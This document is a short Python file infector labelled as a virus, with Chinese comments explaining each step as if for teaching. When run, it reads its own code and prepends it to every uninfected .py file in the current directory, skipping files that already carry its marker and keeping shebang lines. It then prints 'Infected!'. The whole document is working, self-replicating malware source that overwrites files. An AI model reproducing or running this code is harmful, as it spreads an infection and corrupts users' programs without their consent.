##### VIRUS BEGIN #####
import sys,glob,re

# get a copy of the virus
vCode = []  #virus code
fh = open(sys.argv[0],"r")   #sys.argv[0]是指這檔案名稱 virus.py
lines = fh.readlines()
fh.close()
inVirus = False
for line in lines:
    if(re.search('^##### VIRUS BEGIN #####',line)):inVirus = True     #if可以這樣接成一行 #當讀到##### VIRUS BEGIN #####就改成true(來執行下一行的事)
    if(inVirus):vCode.append(line)                                   #把virus的code都添加進去
    if(re.search('^##### VIRUS END #####',line)):break              #當讀到結尾就break結束掉

# find potential victims
progs = glob.glob("*.py")   #取得當前目錄下所有的.py

#check and infect
for prog in progs:
    fh = open(prog,"r")   #先把每個受害者檔案都打開
    pCode = fh.readlines() #並讀取每行
    fh.close()
    infected = False
    for line in pCode:
        if('##### VIRUS BEGIN #####' in line):  #只要原本有這行就會顯示此為已被染,就結束
            infected = True
            break
    if not infected:   #如果沒被感染
        newCode = []  #放置新的代碼
        if('#!' in pCode[0]):newCode.append(pCode.pop(0)) #如果原代碼第一行有#! ,就把那行加入新代碼
        newCode.extend(vCode)  #把virus代碼直接加入新代碼
        newCode.extend(pCode)  #把原本代碼加在後頭
        #writing new virus infected code
        fh = open(prog,'w')   #再次打開受害者
        fh.writelines(newCode) #寫入
        fh.close()
# optional payload
print("Infected!")  #印出 給感染

##### VIRUS END #####
